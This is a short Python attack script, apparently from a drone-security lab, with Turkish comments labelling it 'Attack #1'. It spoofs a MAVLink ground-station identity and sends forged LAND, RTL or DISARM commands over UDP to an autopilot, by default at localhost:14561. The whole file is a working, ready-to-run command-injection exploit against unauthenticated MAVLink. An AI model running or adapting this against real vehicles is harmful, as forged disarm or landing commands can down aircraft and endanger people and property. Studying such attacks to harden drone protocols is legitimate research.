#!/usr/bin/env python3
"""Saldiri #1 - Yetkisiz komut enjeksiyonu (sahte LAND/DISARM/RTL)."""
import argparse
import socket
import time

from pymavlink.dialects.v20 import common as mavlink2

ATTACKER_SYSID = 255
ATTACKER_COMPID = 190

CMDS = {
    "LAND": mavlink2.MAV_CMD_NAV_LAND,
    "RTL": mavlink2.MAV_CMD_NAV_RETURN_TO_LAUNCH,
    "DISARM": mavlink2.MAV_CMD_COMPONENT_ARM_DISARM,
}


class UDPSender:
    def __init__(self, host, port, sysid, compid):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", 0))
        self.addr = (host, int(port))
        self.mav = mavlink2.MAVLink(self, srcSystem=sysid, srcComponent=compid)

    def write(self, data):
        self.sock.sendto(data, self.addr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14561")
    ap.add_argument("--cmd", default="LAND", choices=list(CMDS.keys()))
    ap.add_argument("--repeat", type=int, default=3)
    args = ap.parse_args()

    host, port = args.target.split(":")
    s = UDPSender(host, port, ATTACKER_SYSID, ATTACKER_COMPID)
    cmd_id = CMDS[args.cmd]
    print(f"[saldiri] sahte {args.cmd} komutu -> {args.target} (sysid={ATTACKER_SYSID})")
    for i in range(args.repeat):
        s.mav.command_long_send(
            1, mavlink2.MAV_COMP_ID_AUTOPILOT1,
            cmd_id, 0, 0, 0, 0, 0, 0, 0, 0,
        )
        print(f"[saldiri] gonderildi ({i + 1}/{args.repeat})")
        time.sleep(0.5)
    print("[saldiri] tamam.")


if __name__ == "__main__":
    main()